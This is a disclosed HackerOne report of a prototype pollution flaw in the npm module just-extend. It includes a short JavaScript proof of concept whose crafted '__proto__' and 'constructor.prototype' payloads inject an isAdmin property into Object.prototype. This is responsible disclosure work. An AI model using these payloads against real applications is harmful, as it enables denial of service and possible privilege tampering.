---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '430291'
original_report_id: '430291'
title: Prototype pollution attack in just-extend
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2018-10-29T17:03:52.159Z'
disclosed_at: '2018-11-29T17:13:19.377Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: just-extend
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Prototype pollution attack in just-extend

## Metadata

- HackerOne Report ID: 430291
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2018-11-29T17:13:19.377Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a prototype pollution vulnerability in just-extend
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** just-extend
**version:** 2.1.0, and 3.0.0
**npm page:** `https://www.npmjs.com/package/just-extend`

## Module Description

Part of a library of zero-dependency npm modules that do just do one thing.
Guilt-free utilities for every occasion.

## Module Stats

723,414 downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The functions `just-extend` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` or `{__proto__: {...}}` and send it to `just-extend`.

```javascript
var extend = require('just-extend');

var payload1 = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
extend(true, {}, payload1);
console.log({}.isAdmin); // true

var payload2 = JSON.parse('{"__proto__": {"isAdmin2": true}}');
extend(true, {}, payload2);
console.log({}.isAdmin2); // true
```

# Wrap up

- I contacted the maintainer to let them know: [Y]
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
